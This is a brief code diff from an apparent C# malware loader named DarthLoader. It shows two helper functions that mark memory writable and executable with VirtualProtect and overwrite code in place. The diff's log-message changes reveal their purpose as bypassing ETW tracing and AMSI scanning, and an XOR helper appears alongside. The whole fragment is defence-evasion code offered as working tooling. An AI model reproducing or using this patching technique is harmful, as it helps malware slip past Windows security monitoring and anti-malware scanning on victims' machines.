@@ -112,7 +112,7 @@ namespace DarthLoader
             VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
             Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
             VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
-            Console.WriteLine("[!] FirstHelperFunction successfully ran!");
+            Console.WriteLine("[!] ETW bypassed!");
         }
         public static void SecondHelperFunction()
         {
@@ -124,7 +124,7 @@ namespace DarthLoader
             VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
             Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
             VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
-            Console.WriteLine("[!] SecondHelperFunction successfully ran!");
+            Console.WriteLine("[!] Amsi bypassed!");
         }
 
         public static byte[] XorBytes(byte[] inputByteArray, string keyString)
